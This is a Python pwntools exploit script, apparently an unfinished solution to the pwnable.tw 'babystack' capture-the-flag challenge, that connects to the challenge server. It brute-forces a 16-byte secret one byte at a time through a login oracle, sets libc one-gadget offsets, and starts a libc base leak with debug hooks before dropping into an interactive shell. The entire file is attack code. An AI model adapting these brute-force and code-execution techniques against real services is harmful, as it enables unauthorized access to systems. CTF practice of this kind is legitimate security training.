#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  context.log_level = "debug"
    io = process("./babystack")
    elf = ELF("./babystack")
    #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    oneGadgetOffset = 0x3f2d6

else:
    io = remote("chall.pwnable.tw", 10205)
    elf = ELF("./babystack")
    libc = ELF("./libc_64.so.6")
    oneGadgetOffset = 0x45216

def DEBUG(): 
    raw_input("DEBUG: ")
    gdb.attach(io)

def getBuf():
    buf = ""

    for l in xrange(16):
        for c in xrange(1, 256):
            io.sendlineafter(">> ", "1")
            io.sendlineafter("passowrd :", buf + chr(c))
            if "Success" in io.recvuntil("\n"):
                buf += chr(c)
                if l != 15:
                    io.sendlineafter(">> ", "1")
                success("buf -> {}".format(buf))
                break

    assert len(buf) == 0x10
    success("get buf -> {}".format(buf))
    return buf

def getBase():
    io.sendlineafter(">> ", "3")
    DEBUG()
    io.sendafter(" :", 'a')

if __name__ == "__main__":
    buf = getBuf()
    getBase()
    #  DEBUG()
    io.interactive()
    io.close()

